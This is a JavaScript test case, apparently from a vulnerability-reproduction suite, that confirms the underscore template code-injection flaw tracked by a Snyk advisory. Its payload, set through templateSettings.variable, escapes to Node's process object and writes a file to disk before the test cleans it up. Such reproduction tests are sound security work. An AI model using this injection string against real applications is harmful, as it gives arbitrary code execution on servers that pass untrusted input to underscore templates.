//https://security.snyk.io/vuln/SNYK-JS-UNDERSCORE-1080984
test("Arbitrary code execution in underscore", () => {
  const fs = require("fs");
  const _ = require("underscore");
  const path = "./underscore";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  _.templateSettings.variable =
    "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)";
  const t = _.template("")();

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
